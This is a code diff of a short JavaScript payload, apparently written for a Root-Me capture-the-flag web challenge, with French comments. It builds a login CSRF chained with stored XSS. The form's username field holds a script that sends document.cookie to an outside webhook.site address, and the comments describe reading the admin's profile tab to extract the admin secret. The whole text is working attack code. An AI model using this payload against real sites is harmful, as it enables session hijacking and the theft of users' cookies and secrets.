@@ -1,11 +1,19 @@
 <script>
-window.open('http://challenge01.root-me.org:58003/profile','adminpf');
-setTimeout(function(){
-  var f=document.createElement('form');
-  f.method='POST';
-  f.action='http://challenge01.root-me.org:58003/login';
-  f.innerHTML='<input name="username" value="<script>document.location=`http://webhook.site/3af7409d-4a67-4132-bbaa-05e16cad29ba/?c=${document.cookie}`</script>"><input name="secret" value="x">';
+// La fenêtre principale NE navigue PAS
+// 1. Ouvre le profil admin dans un onglet nommé
+window.open('http://challenge01.root-me.org:58003/profile', 'adminpf');
+
+setTimeout(function() {
+  // 2. CSRF login dans UN AUTRE onglet nommé 'loginwin'
+  var f = document.createElement('form');
+  f.method = 'POST';
+  f.action = 'http://challenge01.root-me.org:58003/login';
+  f.target = 'loginwin';
+  f.innerHTML = '<input name="username" value="document.location=`http://webhook.site/3af7409d-4a67-4132-bbaa-05e16cad29ba/?c=${document.cookie}`"><input name="secret" value="x">';
   document.body.appendChild(f);
+  window.open('about:blank', 'loginwin');
   f.submit();
-},3000);
+  // loginwin → login → redirect /profile → XSS tire
+  // XSS lit adminpf (même domaine) → secret admin
+}, 3000);
 </script>
